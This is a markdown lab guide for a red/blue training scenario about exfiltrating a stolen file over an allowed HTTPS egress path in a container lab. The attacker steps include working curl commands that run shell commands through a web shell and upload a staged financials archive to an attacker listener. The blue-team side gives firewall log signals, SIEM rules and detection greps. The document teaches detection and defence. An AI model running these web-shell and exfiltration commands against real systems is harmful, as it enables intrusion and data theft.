# Phase 6 — Exfiltration over the allowed 443 path

> Reference scenario — authorized lab use only. See [`../DISCLAIMER.md`](../DISCLAIMER.md).

## Video concept

Exfiltration (kill chain step 7) and egress filtering: the attacker must move
data *toward* themselves, and the firewall's egress rules decide which
directions exist. The perimeter's FW-20 rule (web01 → attack-net tcp/443) is
the pre-authorized path this phase uses; the blocked path demonstrates
FW-21/FW-22 and the `FW-EGRESS-DENY` signal.

## Objective

Stage the stolen file on `web01`, ship it to a listener on the attacker
container over the allowed HTTPS egress path — then try the same over SMB
(445) and watch the firewall deny it.

## Attacker steps

```bash
# 1) From the HOST (second terminal, not inside a container): start the
#    receiver inside the attacker container. Port 443 needs root; red has
#    passwordless sudo. Note the attacker's IP for the curl below.
docker exec -d attacker sudo python3 /home/red/exfil-receiver.py 443
docker logs attacker 2>&1 | tail -1        # "[exfil-receiver] listening on 0.0.0.0:443"
docker exec attacker ip -4 addr show eth0  # e.g. 172.31.100.3 - substitute below

# 2) Back in the attacker shell (phase 2 session with /tmp/ck.txt):
#    on web01 via the web shell: stage and exfiltrate.
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=mkdir -p /tmp/staging && cp /tmp/q3-financials.csv /tmp/staging/ && tar czf /tmp/staging/exfil.tar.gz -C /tmp staging" \
  "http://172.31.100.1/console?token=DEV-2026"

# The allowed path: FW-20 accepts web01 -> attack-net tcp/443.
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=curl --max-time 30 -T /tmp/staging/exfil.tar.gz http://172.31.100.3:443/exfil.tar.gz" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: "stored /exfil.tar.gz (… bytes)" - 201 from the receiver

# 3) Confirm receipt on the attacker:
docker exec attacker ls -la /tmp/exfil-in/
#   expected: exfil.tar.gz

# 4) The blocked path: the same move over SMB egress must die at the firewall.
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=curl --max-time 20 -T /tmp/staging/exfil.tar.gz http://172.31.100.3:445/exfil.tar.gz || echo BLOCKED" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: timeout then BLOCKED - no route through FW-21/FW-22

# Blue-team option: if you want to SEE the exfil path's egress rule work both
# ways, the blue team can close the hole mid-run (first-match-wins: prepended
# rule wins) and watch the previously-allowed upload start failing:
#   docker exec fw nft insert rule inet filter forward \
#     ip saddr 10.10.10.5 ip daddr 172.31.100.0/24 tcp dport 443 drop \
#     comment "blue: temporary egress block (phase 6)"
#   # ... re-run step 2's curl ... then revert:
#   docker exec fw nft -a list chain inet filter forward
#   docker exec fw nft delete rule inet filter forward handle <N>
```

## What the blue team sees

| Signal | Where | Sample line | Detection |
|---|---|---|---|
| Blocked SMB egress | fw log | `FW-EGRESS-DENY: IN=eth1 OUT=eth0 SRC=10.10.10.5 DST=172.31.100.3 ... PROTO=TCP SPT=45100 DPT=445` | SIEM rule 100930; DPT=445 specifically → 100931 |
| Allowed 443 upload | fw counters | FW-20 `counter packets 64 bytes 51200 accept` (byte count grows with the upload) | `docker exec fw nft -a list chain inet filter forward` |
| The staging commands | web01 app log | `... CONSOLE-EXEC ... cmd=mkdir -p /tmp/staging && ... tar czf ...` | SIEM rule 100911 |
| The upload process | web01 app log | `... CONSOLE-EXEC ... cmd=curl --max-time 30 -T /tmp/staging/exfil.tar.gz ...` | SIEM rule 100911 |

```bash
# Blue-team commands:
docker logs fw 2>&1 | grep 'FW-EGRESS-DENY' | tail
docker exec fw nft -a list chain inet filter forward | grep -A1 'FW-2[012]'
docker exec web01 grep -E 'staging|curl -T' /var/log/app/access.log | tail
```

Note the asymmetry the video emphasizes: the *blocked* attempt is loudly
logged at the firewall, while the *allowed* attempt is only visible as a
growing counter and the shell commands — that is exactly why egress
allowlists must be narrow and why the SIEM needs host-side logs too.

## IOC vs IoA box

- **IOC (artifact):** `exfil.tar.gz` sitting in `/tmp/exfil-in/` on the
  attacker host; equivalently, its file hash — proof the data left.
- **IoA (behavior):** a large outbound PUT over 443 from the web tier —
  especially at 03:00-style off-hours, preceded by blocked egress probes
  (`FW-EGRESS-DENY` lines) that show the attacker mapping the egress rules.

## Kill chain position

Step 7 — exfiltration (the data has left), which realizes step 8 (impact):
the simulated breach is now reportable.
